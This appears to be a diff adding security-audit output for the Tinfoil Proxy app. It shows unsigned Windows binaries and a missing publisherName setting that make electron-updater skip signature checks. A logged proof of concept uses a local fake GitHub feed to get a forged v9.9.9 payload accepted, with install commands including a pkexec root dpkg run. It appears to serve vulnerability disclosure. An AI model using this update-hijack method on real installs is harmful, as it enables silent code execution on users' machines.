@@ -1,0 +1,53 @@
+== A1. assets match the release's own latest*.yml sha512
+Tinfoil-Proxy-Setup.exe: sha512 matches latest.yml (v0.2.3)
+tinfoil-proxy_amd64.deb: sha512 matches latest-linux.yml (v0.2.3)
+
+== A2. Authenticode (PE security directory)
+Tinfoil-Proxy-Setup.exe: PE32 security_dir(offset=0x0, size=0) -> NO AUTHENTICODE SIGNATURE
+tinfoil-proxy-windows-amd64.exe: PE32+ security_dir(offset=0x0, size=0) -> NO AUTHENTICODE SIGNATURE
+<installer>/resources/bin/tinfoil-proxy.exe: PE32+ security_dir(offset=0x0, size=0) -> NO AUTHENTICODE SIGNATURE
+<installer>/resources/elevate.exe: PE32 security_dir(offset=0x0, size=0) -> NO AUTHENTICODE SIGNATURE
+
+== A3. app-update.yml shipped inside the installer and the .deb (no publisherName)
+-- Tinfoil-Proxy-Setup.exe:resources/app-update.yml
+owner: tinfoilsh
+repo: tinfoil-proxy
+provider: github
+releaseType: release
+updaterCacheDirName: tinfoil-proxy-updater
+-- tinfoil-proxy_amd64.deb:opt/Tinfoil Proxy/resources/app-update.yml
+owner: tinfoilsh
+repo: tinfoil-proxy
+provider: github
+releaseType: release
+updaterCacheDirName: tinfoil-proxy-updater
+-- package-type in .deb: deb  (selects DebUpdater)
+publisherName absent in both
+
+== B. electron-updater 6.8.9 (exact version pinned in tinfoil-proxy app/package-lock.json)
+installed: electron-updater 6.8.9
+    NsisUpdater.js:     async verifySignature(tempUpdateFile) {
+    NsisUpdater.js:         let publisherName;
+    NsisUpdater.js:         try {
+    NsisUpdater.js:             publisherName = (await this.configOnDisk.value).publisherName;
+    NsisUpdater.js:             if (publisherName == null) {
+    NsisUpdater.js:                 return null;
+    NsisUpdater.js:             }
+    NsisUpdater.js:         }
+    NsisUpdater.js:         catch (e) {
+    NsisUpdater.js:             if (e.code === "ENOENT") {
+    NsisUpdater.js:                 // no app-update.yml
+    NsisUpdater.js:                 return null;
+    NsisUpdater.js:             }
+    NsisUpdater.js:             throw e;
+    NsisUpdater.js:         }
+    NsisUpdater.js:         return await this._verifyUpdateCodeSignature(Array.isArray(publisherName) ? publisherName : [publisherName], tempUpdateFile);
+    NsisUpdater.js:     }
+fake GitHub feed on 127.0.0.1:44635; forged release v9.9.9 with self-consistent sha512
+[windows-shipped-config] Authenticode verifier calls: 0
+[windows-shipped-config] update-downloaded version=9.9.9; file is the attacker payload: true
+[windows-shipped-config] install command on quit: <run>/windows-shipped-config/cache/tinfoil-proxy-updater/pending/Tinfoil-Proxy-Setup.exe --updated /S
+[linux-shipped-config] update-downloaded version=9.9.9; file is the attacker payload: true
+[linux-shipped-config] install command on quit: pkexec --disable-internal-agent /bin/bash -c 'dpkg -i <run>/linux-shipped-config/cache/tinfoil-proxy-updater/pending/tinfoil-proxy_amd64.deb'
+[control-windows-with-publisherName] Authenticode verifier calls: 1
+[control-windows-with-publisherName] update REJECTED: New version 9.9.9 is not signed by the application owner: New version is not signed by the application owner: publisherNames: Tinfoil Systems, Inc.
